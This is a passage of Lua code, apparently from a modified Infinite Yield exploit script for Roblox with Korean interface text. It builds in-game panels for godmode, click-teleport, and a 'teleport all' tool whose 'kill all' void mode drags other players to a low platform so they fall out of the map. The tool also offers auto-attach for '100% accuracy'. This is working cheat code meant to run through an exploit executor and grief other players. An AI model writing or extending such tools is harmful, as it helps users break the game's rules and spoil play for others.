			screenGui2.Name = tbl7.GuiName
			screenGui2.ResetOnSpawn = false
			screenGui2.IgnoreGuiInset = true
			screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui2.Parent = PARENT or v7
			tbl9.ScreenGui = screenGui2
			local frame2 = Instance.new("Frame")
			frame2.Name = "Main"
			frame2.Size = tbl7.Size
			frame2.Position = tbl7.Position
			frame2.BackgroundColor3 = tbl7.Background
			frame2.BorderSizePixel = 0
			frame2.Parent = screenGui2
			tbl9.MainFrame = frame2
			createUICorner(frame2, 12)
			createUIStroke(frame2, tbl7.Border, 1)
			local frame3 = Instance.new("Frame")
			frame3.Size = UDim2.new(1, 0, 0, 34)
			frame3.BackgroundTransparency = 1
			frame3.Parent = frame2
			createTextLabel(frame3, "Godmode", UDim2.new(1, -55, 1, 0), UDim2.fromOffset(12, 0), 13).TextColor3 = Color3.fromRGB(245, 245, 250)
			local v10 = createTextLabel(frame3, "●", UDim2.fromOffset(20, 34), UDim2.new(1, -34, 0, 0), 12)
			v10.TextXAlignment = Enum.TextXAlignment.Center
			v10.TextColor3 = tbl7.OffColor
			tbl9.StatusLabel = v10
			local textButton2 = Instance.new("TextButton")
			textButton2.Name = "Close"
			textButton2.Size = UDim2.fromOffset(22, 22)
			textButton2.Position = UDim2.new(1, -28, 0, 6)
			textButton2.BackgroundColor3 = tbl7.Secondary
			textButton2.BorderSizePixel = 0
			textButton2.Text = "×"
			textButton2.TextColor3 = Color3.fromRGB(200, 200, 205)
			textButton2.Font = Enum.Font.GothamBold
			textButton2.TextSize = 17
			textButton2.AutoButtonColor = true
			textButton2.Parent = frame2
			createUICorner(textButton2, 6)

			textButton2.MouseButton1Click:Connect(function()
				fn27()
			end)

			local textButton3 = Instance.new("TextButton")
			textButton3.Name = "Toggle"
			textButton3.Size = UDim2.new(1, -20, 0, 30)
			textButton3.Position = UDim2.new(0, 10, 0, 36)
			textButton3.BackgroundColor3 = tbl7.OffColor
			textButton3.BorderSizePixel = 0
			textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton3.Font = Enum.Font.GothamBold
			textButton3.TextSize = 12
			textButton3.AutoButtonColor = true
			textButton3.Parent = frame2
			createUICorner(textButton3, 8)
			tbl9.ToggleButton = textButton3

			textButton3.MouseButton1Click:Connect(function()
				fn22()
			end)

			local textButton4 = Instance.new("TextButton")
			textButton4.Name = "AutoToggle"
			textButton4.Size = UDim2.new(1, -20, 0, 22)
			textButton4.Position = UDim2.new(0, 10, 0, 70)
			textButton4.BackgroundColor3 = tbl7.Secondary
			textButton4.BorderSizePixel = 0
			textButton4.Text = "☐ 자동 토글 (OFF)"
			textButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton4.Font = Enum.Font.GothamBold
			textButton4.TextSize = 11
			textButton4.AutoButtonColor = true
			textButton4.Parent = frame2
			createUICorner(textButton4, 6)
			tbl9.AutoToggleBtn = textButton4

			textButton4.MouseButton1Click:Connect(function()
				tbl9.AutoToggle = not tbl9.AutoToggle
				fn19()

				if tbl9.AutoToggle then
					fn25()
				elseif tbl9.AutoToggleThread then
					task.cancel(tbl9.AutoToggleThread)
					tbl9.AutoToggleThread = nil
				end
			end)

			local textButton5 = Instance.new("TextButton")
			textButton5.Name = "DebugLog"
			textButton5.Size = UDim2.new(1, -20, 0, 22)
			textButton5.Position = UDim2.new(0, 10, 0, 96)
			textButton5.BackgroundColor3 = tbl7.Secondary
			textButton5.BorderSizePixel = 0
			textButton5.Text = "🔍 애니 로그 디버그 [OFF]"
			textButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton5.Font = Enum.Font.GothamBold
			textButton5.TextSize = 11
			textButton5.AutoButtonColor = true
			textButton5.Parent = frame2
			createUICorner(textButton5, 6)
			tbl9.DebugLogBtn = textButton5

			textButton5.MouseButton1Click:Connect(function()
				tbl9.DebugLog = not tbl9.DebugLog
				fn19()

				if tbl9.DebugLog then
					fn23()
					notify("Anim Debug", "애니메이션 디버그 로그가 켜졌습니다. F9 콘솔을 확인하세요!", 3)
				else
					notify("Anim Debug", "애니메이션 디버그 로그가 꺼졌습니다.", 2)
				end
			end)

			local textButton6 = Instance.new("TextButton")
			textButton6.Name = "KeybindSet"
			textButton6.Size = UDim2.new(1, -20, 0, 20)
			textButton6.Position = UDim2.new(0, 10, 0, 122)
			textButton6.BackgroundColor3 = tbl7.Secondary
			textButton6.BorderSizePixel = 0
			textButton6.Text = "⌨ 단축키 변경 (현재: " .. tbl7.ToggleKey.Name .. ")"
			textButton6.TextColor3 = tbl7.SubTextColor
			textButton6.Font = Enum.Font.Gotham
			textButton6.TextSize = 10
			textButton6.Parent = frame2
			createUICorner(textButton6, 6)
			tbl9.KeybindButton = textButton6
			local flag7 = false

			textButton6.MouseButton1Click:Connect(function()
				if flag7 then
					return
				end
				flag7 = true
				textButton6.Text = "⌨ 바꿀 키를 누르세요..."
				textButton6.TextColor3 = Color3.fromRGB(255, 220, 100)
				local connection7 = nil

				connection7 = v8.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.Keyboard then
						tbl7.ToggleKey = input.KeyCode
						flag7 = false
						textButton6.Text = "⌨ 단축키 변경 (현재: " .. input.KeyCode.Name .. ")"
						textButton6.TextColor3 = tbl7.SubTextColor
						fn19()
						connection7:Disconnect()
					end
				end)
			end)

			local textLabel = Instance.new("TextLabel")
			textLabel.Size = UDim2.new(1, -20, 0, 30)
			textLabel.Position = UDim2.new(0, 10, 0, 146)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = "켤시 상대공격 못함, \n 어태치당하면 공격됩니다 상대가"
			textLabel.TextColor3 = tbl7.SubTextColor
			textLabel.Font = Enum.Font.Gotham
			textLabel.TextSize = 9
			textLabel.TextWrapped = true
			textLabel.TextYAlignment = Enum.TextYAlignment.Top
			textLabel.Parent = frame2

			tbl9.InputConnection = v8.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then
					return
				end

				if input.KeyCode == tbl7.ToggleKey then
					fn22()
				end
			end)

			fn26(frame2)
			fn19()
			fn23()
		end

		local function fn29()
			v9.CharacterAdded:Connect(function()
				task.wait(1.2)
				fn23()

				if tbl9.AutoToggle then
					fn25()
				elseif tbl9.Enabled then
					fn21()
					task.wait(0.1)
					fn20()
				end
			end)
		end

		fn28()
		fn29()
	end)

	Players_2.LocalPlayer.Chatted:Connect(function(message)
		local _prefix = prefix

		if message:sub(1, #prefix) == _prefix then
			execCmd(message:sub(#prefix + 1), Players_2.LocalPlayer, true)
		end
	end)
end

if eventBinds then
	eventEditor.LoadData(eventBinds)
end

eventEditor.Refresh()
eventEditor.FireEvent("OnExecute")

if aliases and #aliases > 0 then
	local tbl5 = {}

	for _, v in pairs(cmds) do
		tbl5[v.NAME:lower()] = v

		for _, alia in pairs(v.ALIAS) do
			tbl5[alia:lower()] = v
		end
	end

	for i = 1, #aliases do
		local v = string.lower(aliases[i].CMD)
		local v2 = string.lower(aliases[i].ALIAS)

		if tbl5[v] then
			customAlias[v2] = tbl5[v]
		end
	end

	refreshaliases()
end

IYMouse.Move:Connect(checkTT)

task.spawn(function()
	local ok, result = pcall(function()
		local response = game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/version")
		return HttpService:JSONDecode(response)
	end)

	if ok then
		if currentVersion ~= result.Version then
			notify("Outdated", "Get the new version at infyiff.github.io")
		end

		if result.Announcement and result.Announcement ~= "" then
			local frame2 = Instance.new("Frame")
			local frame3 = Instance.new("Frame")
			local textLabel = Instance.new("TextLabel")
			local frame4 = Instance.new("Frame")
			local textLabel2 = Instance.new("TextLabel")
			local textButton2 = Instance.new("TextButton")
			local imageLabel = Instance.new("ImageLabel")
			frame2.Name = randomString()
			frame2.Parent = PARENT
			frame2.Active = true
			frame2.BackgroundTransparency = 1
			frame2.Position = UDim2.new(0.5, -180, 0, -500)
			frame2.Size = UDim2.new(0, 360, 0, 20)
			frame2.ZIndex = 10
			frame3.Name = "background"
			frame3.Parent = frame2
			frame3.Active = true
			frame3.BackgroundColor3 = currentShade1
			frame3.BorderSizePixel = 0
			frame3.Position = UDim2.new(0, 0, 0, 20)
			frame3.Size = UDim2.new(0, 360, 0, 150)
			frame3.ZIndex = 10
			textLabel.Parent = frame3
			textLabel.BackgroundTransparency = 1
			textLabel.Position = UDim2.new(0, 5, 0, 5)
			textLabel.Size = UDim2.new(0, 350, 0, 140)
			textLabel.Font = Enum.Font.SourceSans
			textLabel.TextSize = 18
			textLabel.TextWrapped = true
			textLabel.Text = Announcement
			textLabel.TextColor3 = currentText1
			textLabel.TextXAlignment = Enum.TextXAlignment.Left
			textLabel.TextYAlignment = Enum.TextYAlignment.Top
			textLabel.ZIndex = 10
			frame4.Name = "shadow"
			frame4.Parent = frame2
			frame4.BackgroundColor3 = currentShade2
			frame4.BorderSizePixel = 0
			frame4.Size = UDim2.new(0, 360, 0, 20)
			frame4.ZIndex = 10
			textLabel2.Name = "PopupText"
			textLabel2.Parent = frame4
			textLabel2.BackgroundTransparency = 1
			textLabel2.Size = UDim2.new(1, 0, 0.95, 0)
			textLabel2.ZIndex = 10
			textLabel2.Font = Enum.Font.SourceSans
			textLabel2.TextSize = 14
			textLabel2.Text = "Server Announcement"
			textLabel2.TextColor3 = currentText1
			textLabel2.TextWrapped = true
			textButton2.Name = "Exit"
			textButton2.Parent = frame4
			textButton2.BackgroundTransparency = 1
			textButton2.Position = UDim2.new(1, -20, 0, 0)
			textButton2.Size = UDim2.new(0, 20, 0, 20)
			textButton2.Text = ""
			textButton2.ZIndex = 10
			imageLabel.Parent = textButton2
			imageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
			imageLabel.BackgroundTransparency = 1
			imageLabel.Position = UDim2.new(0, 5, 0, 5)
			imageLabel.Size = UDim2.new(0, 10, 0, 10)
			imageLabel.Image = "rbxassetid://5054663650"
			imageLabel.ZIndex = 10
			wait(1)
			frame2:TweenPosition(UDim2.new(0.5, -180, 0, 150), "InOut", "Quart", 0.5, true, nil)

			textButton2.MouseButton1Click:Connect(function()
				frame2:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
				wait(0.6)
				frame2:Destroy()
			end)
		end
	end
end)

do
	local Players_2 = game:GetService("Players")
	local UserInputService_2 = game:GetService("UserInputService")
	local RunService_2 = game:GetService("RunService")
	getgenv().ClickTPGUI_Active = false
	local tbl5 = {}
	local screenGui2 = nil

	local function fn2()
		getgenv().ClickTPGUI_Active = false

		for _, v in pairs(tbl5) do
			if v then
				v:Disconnect()
			end
		end

		table.clear(tbl5)

		if screenGui2 then
			screenGui2:Destroy()
			screenGui2 = nil
		end
	end

	addcmd("clicktpgui", { "ctg" }, function(arg, arg2)
		if getgenv().addvape then
			getgenv().addvape("clicktpgui")
		end

		fn2()
		getgenv().ClickTPGUI_Active = true
		local playerGui = arg2:WaitForChild("PlayerGui")
		screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "ClickTPGUI_Custom"
		screenGui2.ResetOnSpawn = false
		screenGui2.Parent = playerGui
		local mouse = arg2:GetMouse()
		local flag2 = UserInputService_2.TouchEnabled and not UserInputService_2.KeyboardEnabled

		local function fn3(arg3)
			local character = arg2.Character
			if not character then
				return
			end
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoidRootPart or not humanoid then
				return
			end

			if humanoid.SeatPart then
				humanoid.Sit = false
				task.wait(0.1)
			end

			local n = humanoid.HipHeight > 0 and humanoid.HipHeight + 1 or 4
			local position = humanoidRootPart.Position
			humanoidRootPart.CFrame = CFrame.new(arg3, Vector3.new(position.X, arg3.Y, position.Z)) * CFrame.Angles(0, 3.1415926535897931, 0) + Vector3.new(0, n, 0)
		end

		if flag2 or UserInputService_2.TouchEnabled then
			local textButton2 = Instance.new("TextButton", screenGui2)
			textButton2.Size = UDim2.new(0, 50, 0, 50)
			textButton2.Position = UDim2.new(0.8, 0, 0.6, 0)
			textButton2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			textButton2.Text = "◎"
			textButton2.TextColor3 = Color3.new(1, 1, 1)
			textButton2.TextSize = 24
			textButton2.Font = Enum.Font.GothamBold
			Instance.new("UICorner", textButton2).CornerRadius = UDim.new(1, 0)
			local uiStroke3 = Instance.new("UIStroke", textButton2)
			uiStroke3.Thickness = 3
			uiStroke3.Color = Color3.fromRGB(100, 100, 100)
			local flag3 = nil
			local v = nil
			local position = nil
			local position2 = nil

			tbl5[#tbl5 + 1] = textButton2.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
					flag3 = true
					position = input.Position
					position2 = textButton2.Position
				end
			end)

			tbl5[#tbl5 + 1] = textButton2.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
					flag3 = false
				end
			end)

			tbl5[#tbl5 + 1] = UserInputService_2.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
					v = input
				end
			end)

			tbl5[#tbl5 + 1] = RunService_2.Heartbeat:Connect(function()
				if flag3 and v then
					local n = v.Position - position
					textButton2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
				end
			end)

			local flag4 = false
			local n = 0

			tbl5[#tbl5 + 1] = textButton2.MouseButton1Click:Connect(function()
				flag4 = not flag4

				if flag4 then
					uiStroke3.Color = Color3.fromHSV(0, 1, 1)
				else
					uiStroke3.Color = Color3.fromRGB(100, 100, 100)
				end
			end)

			tbl5[#tbl5 + 1] = RunService_2.RenderStepped:Connect(function()
				if flag4 then
					n = (n + 0.01) % 1
					uiStroke3.Color = Color3.fromHSV(n, 1, 1)
				end
			end)

			tbl5[#tbl5 + 1] = UserInputService_2.TouchTapInWorld:Connect(function(arg3, arg4)
				if arg4 or not flag4 then
					return
				end
				local v2 = workspace.CurrentCamera:ViewportPointToRay(arg3.X, arg3.Y)
				local raycastParams = RaycastParams.new()
				raycastParams.FilterType = Enum.RaycastFilterType.Exclude

				if arg2.Character then
					raycastParams.FilterDescendantsInstances = { arg2.Character }
				end

				local hit = workspace:Raycast(v2.Origin, v2.Direction * 1000, raycastParams)

				if hit then
					fn3(hit.Position)
				end
			end)
		else
			local frame2 = Instance.new("Frame", screenGui2)
			frame2.Size = UDim2.new(0, 200, 0, 100)
			frame2.Position = UDim2.new(0.5, -100, 0.5, -50)
			frame2.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
			frame2.BorderSizePixel = 0
			frame2.Active = true
			frame2.Draggable = true
			local textLabel = Instance.new("TextLabel", frame2)
			textLabel.Size = UDim2.new(1, 0, 0, 30)
			textLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
			textLabel.TextColor3 = Color3.new(1, 1, 1)
			textLabel.Text = "Click TP (키바인드)"
			textLabel.Font = Enum.Font.GothamBold
			textLabel.TextSize = 14
			local textButton2 = Instance.new("TextButton", frame2)
			textButton2.Size = UDim2.new(0, 30, 0, 30)
			textButton2.Position = UDim2.new(1, -30, 0, 0)
			textButton2.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
			textButton2.TextColor3 = Color3.new(1, 1, 1)
			textButton2.Text = "X"
			textButton2.Font = Enum.Font.GothamBold
			textButton2.TextSize = 14
			textButton2.BorderSizePixel = 0

			textButton2.MouseButton1Click:Connect(function()
				if getgenv().delvape then
					getgenv().delvape("clicktpgui")
				end

				fn2()
			end)

			local textLabel2 = Instance.new("TextLabel", frame2)
			textLabel2.Size = UDim2.new(0, 80, 0, 30)
			textLabel2.Position = UDim2.new(0, 10, 0, 50)
			textLabel2.BackgroundTransparency = 1
			textLabel2.TextColor3 = Color3.new(1, 1, 1)
			textLabel2.Text = "단축키:"
			textLabel2.Font = Enum.Font.Gotham
			textLabel2.TextSize = 14
			textLabel2.TextXAlignment = Enum.TextXAlignment.Left
			local textBox = Instance.new("TextBox", frame2)
			textBox.Size = UDim2.new(0, 80, 0, 30)
			textBox.Position = UDim2.new(0, 100, 0, 50)
			textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
			textBox.TextColor3 = Color3.new(1, 1, 1)
			textBox.Text = "E"
			textBox.Font = Enum.Font.GothamBold
			textBox.TextSize = 14

			tbl5[#tbl5 + 1] = UserInputService_2.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then
					return
				end
				local str = textBox.Text:upper()
				if str == "" then
					return
				end

				if input.KeyCode.Name:upper() == str then
					fn3(mouse.Hit.Position)
				end
			end)
		end
	end)

	addcmd("unclicktpgui", { "unctg" }, function()
		if getgenv().delvape then
			getgenv().delvape("clicktpgui")
		end

		fn2()
		notify("Click TP GUI", "꺼졌습니다 ❌", 2)
	end)

	getgenv().TpaRunning = false
	local v = nil

	local function createPart(arg)
		local unknownSafetyPlatform = workspace:FindFirstChild("Unknown_Safety_Platform")

		if unknownSafetyPlatform then
			unknownSafetyPlatform:Destroy()
		end

		local part = Instance.new("Part")
		part.Name = "Unknown_Safety_Platform"
		part.Size = Vector3.new(200, 1.5, 200)
		part.Anchored = true
		part.CanCollide = true
		part.CastShadow = false
		part.Material = Enum.Material.Neon
		part.Color = Color3.fromRGB(0, 255, 150)
		part.CFrame = CFrame.new(0, arg or -499, 0)
		part.Parent = workspace
		return part
	end

	addcmd("teleportallgui", { "tpa" }, function()
		if getgenv().addvape then
			getgenv().addvape("teleportallgui")
		end

		local localPlayer2 = Players_2.LocalPlayer
		local playerGui = localPlayer2:WaitForChild("PlayerGui")

		if playerGui:FindFirstChild("TPA_GUI") then
			playerGui:FindFirstChild("TPA_GUI"):Destroy()
		end

		local screenGui3 = Instance.new("ScreenGui")
		screenGui3.Name = "TPA_GUI"
		screenGui3.ResetOnSpawn = false
		screenGui3.Parent = playerGui
		v = screenGui3

		local tbl6 = {
			delay = 0.3,
			killAll = false,
			voidDelay = 0.5,
			accuracy = false,
			voidY = -499,
			ox = 0,
			oy = 0,
			oz = 0,
			loopMode = false,
			loopCount = 1,
			loopDelay = 1,
			randomOrder = false,
			rangeFilter = false,
			maxRange = 500,
			excludeSelf = true,
			tpDir = "behind",
			notifyEach = false,
		}

		local function fn3(arg, arg2)
			Instance.new("UICorner", arg).CornerRadius = UDim.new(0, arg2 or 8)
		end

		local function createTextLabel(arg, text, arg2, arg3, arg4, arg5, textColor3, textSize, textXAlignment)
			local textLabel = Instance.new("TextLabel", arg)
			textLabel.Position = UDim2.new(0, arg2, 0, arg3)
			textLabel.Size = UDim2.new(0, arg4, 0, arg5)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = text
			textLabel.TextColor3 = textColor3 or Color3.fromRGB(200, 200, 200)
			textLabel.Font = Enum.Font.Gotham
			textLabel.TextSize = textSize or 12
			textLabel.TextXAlignment = textXAlignment or Enum.TextXAlignment.Left
			textLabel.TextWrapped = true
			return textLabel
		end

		local function createTextBox(arg, arg2, arg3, arg4, arg5, arg6)
			local textBox = Instance.new("TextBox", arg)
			textBox.Position = UDim2.new(0, arg3, 0, arg4)
			textBox.Size = UDim2.new(0, arg5, 0, arg6)
			textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
			textBox.TextColor3 = Color3.new(1, 1, 1)
			textBox.Text = tostring(arg2)
			textBox.Font = Enum.Font.Gotham
			textBox.TextSize = 13
			textBox.BorderSizePixel = 0
			fn3(textBox, 5)
			return textBox
		end

		local function createTextButton(arg, text, arg2, arg3, arg4, arg5, backgroundColor3)
			local textButton2 = Instance.new("TextButton", arg)
			textButton2.Position = UDim2.new(0, arg2, 0, arg3)
			textButton2.Size = UDim2.new(0, arg4, 0, arg5)
			textButton2.BackgroundColor3 = backgroundColor3 or Color3.fromRGB(60, 60, 75)
			textButton2.TextColor3 = Color3.new(1, 1, 1)
			textButton2.Text = text
			textButton2.Font = Enum.Font.GothamBold
			textButton2.TextSize = 12
			textButton2.BorderSizePixel = 0
			fn3(textButton2, 6)
			return textButton2
		end

		local function fn4(arg, arg2, arg3, arg4, arg5, arg6, arg7, arg8)
			local v2 = createTextButton(arg, "", arg3, arg4, arg5, arg6)

			local function fn5()
				local v3 = arg7()
				v2.BackgroundColor3 = v3 and Color3.fromRGB(40, 180, 80) or Color3.fromRGB(180, 50, 50)
				v2.Text = arg2 .. (v3 and "  ✔ ON" or "  ✘ OFF")
			end

			fn5()

			v2.MouseButton1Click:Connect(function()
				arg8(not arg7())
				fn5()
			end)

			return v2
		end

		local tbl7 = {}

		local function createFrame(name, arg, arg2, arg3)
			if tbl7[name] then
				tbl7[name]:Destroy()
				tbl7[name] = nil
				return nil
			end

			local frame2 = Instance.new("Frame", screenGui3)
			frame2.Name = name
			frame2.Size = UDim2.new(0, arg2, 0, arg3)
			frame2.Position = UDim2.new(0.5, 20, 0.5, -(arg3 / 2))
			frame2.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
			frame2.BorderSizePixel = 0
			frame2.Active = true
			fn3(frame2, 10)
			tbl7[name] = frame2
			local frame3 = Instance.new("Frame", frame2)
			frame3.Size = UDim2.new(1, 0, 0, 32)
			frame3.BackgroundColor3 = Color3.fromRGB(38, 38, 48)
			frame3.BorderSizePixel = 0
			fn3(frame3, 10)
			local left = Enum.TextXAlignment.Left
			createTextLabel(frame3, arg, 10, 0, arg2 - 50, 32, Color3.fromRGB(180, 220, 255), 13, left)
			local v2 = createTextButton(frame3, "X", arg2 - 32, 3, 26, 26, Color3.fromRGB(220, 50, 50))
			fn3(v2, 13)

			v2.MouseButton1Click:Connect(function()
				frame2:Destroy()
				tbl7[name] = nil
			end)

			local flag2 = nil
			local position = nil
			local position2 = nil

			frame3.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					flag2 = true
					position = input.Position
					position2 = frame2.Position
				end
			end)

			UserInputService_2.InputChanged:Connect(function(input)
				if flag2 and input.UserInputType == Enum.UserInputType.MouseMovement then
					local n = input.Position - position
					frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
				end
			end)

			UserInputService_2.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					flag2 = false
				end
			end)

			return frame2, 34
		end

		local frame2 = Instance.new("Frame", screenGui3)
		frame2.Size = UDim2.new(0, 270, 0, 310)
		frame2.Position = UDim2.new(0.5, -135, 0.5, -155)
		frame2.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
		frame2.BorderSizePixel = 0
		frame2.Active = true
		fn3(frame2, 10)
		local frame3 = Instance.new("Frame", frame2)
		frame3.Size = UDim2.new(1, 0, 0, 36)
		frame3.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
		frame3.BorderSizePixel = 0
		fn3(frame3, 10)
		createTextLabel(frame3, "언노운 티피올", 12, 0, 220, 36, Color3.fromRGB(100, 210, 255), 14)
		local v2 = createTextButton(frame3, "X", 238, 5, 26, 26, Color3.fromRGB(220, 50, 50))
		fn3(v2, 13)

		v2.MouseButton1Click:Connect(function()
			getgenv().TpaRunning = false

			if getgenv().delvape then
				getgenv().delvape("teleportallgui")
			end

			screenGui3:Destroy()
		end)

		local flag2 = nil
		local position = nil
		local position2 = nil

		frame3.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				flag2 = true
				position = input.Position
				position2 = frame2.Position
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if flag2 and input.UserInputType == Enum.UserInputType.MouseMovement then
				local n = input.Position - position
				frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n.X, position2.Y.Scale, position2.Y.Offset + n.Y)
			end
		end)

		UserInputService_2.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				flag2 = false
			end
		end)

		for i, v3 in ipairs({ { "기본 설정", "basic" }, { "타겟 설정", "target" }, { "공허모드", "killall" }, { "반복설정", "loop" } }) do
			local color = Color3.fromRGB
			local v4 = createTextButton(frame2, v3[1], 10 + (i - 1) % 2 * 124, 44 + math.floor((i - 1) / 2) * 40, 118, 34, color(45, 45, 60))
			v4.TextSize = 12

			v4.MouseButton1Click:Connect(function()
				local v5 = v3[2]

				if v5 == "basic" then
					local basic, basic2 = createFrame("basic", "⚙ 기본 설정", 230, 210)
					if not basic then
						return
					end
					createTextLabel(basic, "딜레이 (초)", 10, basic2, 100, 22, nil, 12)
					local v6 = createTextBox(basic, tbl6.delay, 115, basic2, 100, 22)
					createTextLabel(basic, "XYZ 오프셋", 10, basic2 + 30, 100, 22, nil, 12)
					local v7 = createTextBox(basic, tbl6.ox, 10, basic2 + 52, 62, 22)
					local v8 = createTextBox(basic, tbl6.oy, 82, basic2 + 52, 62, 22)
					local v9 = createTextBox(basic, tbl6.oz, 154, basic2 + 52, 62, 22)
					local center = Enum.TextXAlignment.Center
					createTextLabel(basic, "X", 10, basic2 + 76, 62, 16, Color3.fromRGB(150, 150, 150), 11, center)
					local center2 = Enum.TextXAlignment.Center
					createTextLabel(basic, "Y", 82, basic2 + 76, 62, 16, Color3.fromRGB(150, 150, 150), 11, center2)
					local center3 = Enum.TextXAlignment.Center
					createTextLabel(basic, "Z", 154, basic2 + 76, 62, 16, Color3.fromRGB(150, 150, 150), 11, center3)
					createTextLabel(basic, "TP 방향", 10, basic2 + 100, 100, 22, nil, 12)
					local tbl8 = { "behind", "front", "side", "exact" }
					local n = 1

					for i2, v10 in ipairs(tbl8) do
						if v10 == tbl6.tpDir then
							n = i2
						end
					end

					local v10 = createTextButton(basic, tbl6.tpDir, 115, basic2 + 100, 100, 22, Color3.fromRGB(60, 90, 150))

					v10.MouseButton1Click:Connect(function()
						n = n % #tbl8 + 1
						tbl6.tpDir = tbl8[n]
						v10.Text = tbl6.tpDir
					end)

					createTextLabel(basic, "이동마다 알림", 10, basic2 + 130, 120, 22, nil, 12)

					fn4(basic, "", 135, basic2 + 130, 80, 22, function()
						return tbl6.notifyEach
					end, function(notifyEach)
						tbl6.notifyEach = notifyEach
					end)

					createTextButton(basic, "✔ 적용", 10, basic2 + 160, 205, 28, Color3.fromRGB(40, 170, 80)).MouseButton1Click:Connect(function()
						tbl6.delay = tonumber(v6.Text) or tbl6.delay
						tbl6.ox = tonumber(v7.Text) or 0
						tbl6.oy = tonumber(v8.Text) or 0
						tbl6.oz = tonumber(v9.Text) or 0
						basic:Destroy()
						tbl7.basic = nil
					end)
				elseif v5 == "target" then
					local target, target2 = createFrame("target", "🎯 대상 설정", 230, 185)
					if not target then
						return
					end
					createTextLabel(target, "랜덤 순서", 10, target2, 120, 24, nil, 12)

					fn4(target, "", 140, target2, 80, 24, function()
						return tbl6.randomOrder
					end, function(randomOrder)
						tbl6.randomOrder = randomOrder
					end)

					createTextLabel(target, "범위 필터", 10, target2 + 32, 120, 24, nil, 12)

					fn4(target, "", 140, target2 + 32, 80, 24, function()
						return tbl6.rangeFilter
					end, function(rangeFilter)
						tbl6.rangeFilter = rangeFilter
					end)

					createTextLabel(target, "최대 범위 (스터드)", 10, target2 + 60, 130, 22, nil, 12)
					local v6 = createTextBox(target, tbl6.maxRange, 145, target2 + 60, 75, 22)
					createTextLabel(target, "자기 자신 제외", 10, target2 + 88, 130, 24, nil, 12)

					fn4(target, "", 140, target2 + 88, 80, 24, function()
						return tbl6.excludeSelf
					end, function(excludeSelf)
						tbl6.excludeSelf = excludeSelf
					end)

					createTextButton(target, "✔ 적용", 10, target2 + 122, 205, 28, Color3.fromRGB(40, 170, 80)).MouseButton1Click:Connect(function()
						tbl6.maxRange = tonumber(v6.Text) or tbl6.maxRange
						target:Destroy()
						tbl7.target = nil
					end)
				elseif v5 == "killall" then
					local killall, killall2 = createFrame("killall", "💀 공허모드 / Kill All", 230, 185)
					if not killall then
						return
					end
					createTextLabel(killall, "공허모드 (개별 떨구기)", 10, killall2, 130, 24, nil, 11)

					fn4(killall, "", 140, killall2, 80, 24, function()
						return tbl6.killAll
					end, function(killAll)
						tbl6.killAll = killAll
					end)

					createTextLabel(killall, "공허 대기시간 (초)", 10, killall2 + 30, 120, 22, nil, 11)
					local v6 = createTextBox(killall, tbl6.voidDelay, 135, killall2 + 30, 80, 22)
					createTextLabel(killall, "정확도100%(오토어태치)", 10, killall2 + 60, 140, 24, nil, 11)

					fn4(killall, "", 155, killall2 + 60, 65, 24, function()
						return tbl6.accuracy
					end, function(accuracy)
						tbl6.accuracy = accuracy
					end)

					createTextLabel(killall, "공허 Y 높이", 10, killall2 + 90, 120, 22, nil, 12)
					local v7 = createTextBox(killall, tbl6.voidY, 135, killall2 + 90, 80, 22)

					createTextButton(killall, "✔ 적용", 10, killall2 + 125, 205, 28, Color3.fromRGB(40, 170, 80)).MouseButton1Click:Connect(function()
						tbl6.voidDelay = tonumber(v6.Text) or tbl6.voidDelay
						tbl6.voidY = tonumber(v7.Text) or tbl6.voidY
						killall:Destroy()
						tbl7.killall = nil
					end)
				elseif v5 == "loop" then
					local loop, loop2 = createFrame("loop", "🔁 반복 설정", 230, 155)
					if not loop then
						return
					end
					createTextLabel(loop, "반복 모드", 10, loop2, 120, 24, nil, 12)

					fn4(loop, "", 140, loop2, 80, 24, function()
						return tbl6.loopMode
					end, function(loopMode)
						tbl6.loopMode = loopMode
					end)

					createTextLabel(loop, "반복 횟수 (0=무한)", 10, loop2 + 30, 140, 22, nil, 12)
					local v6 = createTextBox(loop, tbl6.loopCount, 148, loop2 + 30, 72, 22)
					createTextLabel(loop, "루프 간 딜레이(초)", 10, loop2 + 58, 140, 22, nil, 12)
